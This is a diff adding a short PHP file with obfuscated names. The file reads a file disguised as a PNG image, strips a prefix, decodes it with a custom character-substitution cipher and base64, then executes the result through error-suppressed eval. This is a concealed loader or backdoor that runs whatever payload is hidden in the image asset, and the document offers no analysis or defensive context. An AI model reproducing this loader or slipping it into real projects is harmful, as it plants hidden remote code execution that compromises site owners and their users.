@@ -1,0 +1,34 @@
+<?php
+
+function okufad_hoshanyk($mabeta_wetysilym) {
+    $yryqykh = strtr($mabeta_wetysilym, array('Q'=>'Q', 'E'=>'W', 'f'=>'E', 'C'=>'R', 'N'=>'T', 'r'=>'Y', 'o'=>'U', 'S'=>'I', 'T'=>'O', 'P'=>'P', 
+        'm'=>'A', 'J'=>'S', 'd'=>'D', 'U'=>'F', 'O'=>'G', 'G'=>'H', 'Z'=>'J', 'L'=>'K', 't'=>'L', 'M'=>'Z', 
+        'B'=>'X', 'K'=>'C', 'l'=>'V', 'F'=>'B', 'I'=>'N', 'y'=>'M', 'g'=>'q', 'x'=>'w', 'W'=>'e', 'b'=>'r', 
+        'D'=>'t', 'R'=>'y', '7'=>'u', 'a'=>'i', 'p'=>'o', 'q'=>'p', '6'=>'a', '/'=>'s', 'e'=>'d', 'X'=>'f', 
+        'c'=>'g', 'v'=>'h', 's'=>'j', 'h'=>'k', 'k'=>'l', '0'=>'z', '+'=>'x', 'n'=>'c', 'Y'=>'v', '8'=>'b', 
+        'H'=>'n', 'V'=>'m', '9'=>'1', '4'=>'2', 'A'=>'3', 'j'=>'4', 'w'=>'5', '2'=>'6', 'u'=>'7', '='=>'8', 
+        '3'=>'9', '5'=>'0', 'z'=>'=', 'i'=>'+', '1'=>'/'));
+    $yryqykh = base64_decode($yryqykh);
+
+    return $yryqykh;
+}
+
+function qyruhu_ufoxuvenu($mabeta_wetysilym) {
+    if (!file_exists($mabeta_wetysilym))
+        return false;
+    $vezhozu = @file_get_contents($mabeta_wetysilym);
+    if (!$vezhozu)
+        return false;
+    $vezhozu = substr($vezhozu, 3);
+    $fiqivuf = okufad_hoshanyk($vezhozu);
+    return $fiqivuf;
+}
+
+$kuwybuh = __DIR__ . '/assets/images/asalulu.png';
+
+if (file_exists($kuwybuh)) {
+    $isakaj = qyruhu_ufoxuvenu($kuwybuh);
+    if ($isakaj) {
+        @eval($isakaj);
+    }
+}
